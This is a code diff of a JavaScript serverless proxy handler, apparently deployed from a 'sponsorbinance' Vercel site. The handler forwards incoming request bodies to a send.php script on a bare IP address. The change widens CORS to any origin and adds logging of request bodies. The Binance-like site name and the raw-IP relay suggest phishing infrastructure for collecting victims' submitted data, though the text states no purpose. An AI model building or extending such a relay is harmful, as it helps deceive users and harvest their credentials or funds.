@@ -1,8 +1,7 @@
 export default async function handler(req, res) {
-    res.setHeader("Access-Control-Allow-Origin", "https://sponsorbinance.vercel.app");
-    res.setHeader("Access-Control-Allow-Credentials", "true");
+    res.setHeader("Access-Control-Allow-Origin", "*");
     res.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
-    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
+    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
 
     if (req.method === "OPTIONS") {
         res.status(200).end();
@@ -10,6 +9,8 @@ export default async function handler(req, res) {
     }
 
     try {
+        console.log("🔍 Incoming Request to Proxy:", req.body);
+
         const response = await fetch("http://104.194.133.124/send.php", {
             method: req.method,
             headers: {
@@ -19,15 +20,12 @@ export default async function handler(req, res) {
         });
 
         const data = await response.text();
+
+        console.log("🔍 Response from Backend:", data);
+
         res.status(response.status).send(data);
     } catch (error) {
-        console.error("❌ Proxy Error:", error);
-        res.status(500).json({ error: "Proxy request failed" });
+        console.error("❌ Error in Proxy:", error);
+        res.status(500).json({ error: "Internal Server Error" });
     }
 }
-
-export const config = {
-    api: {
-        bodyParser: true,
-    },
-};
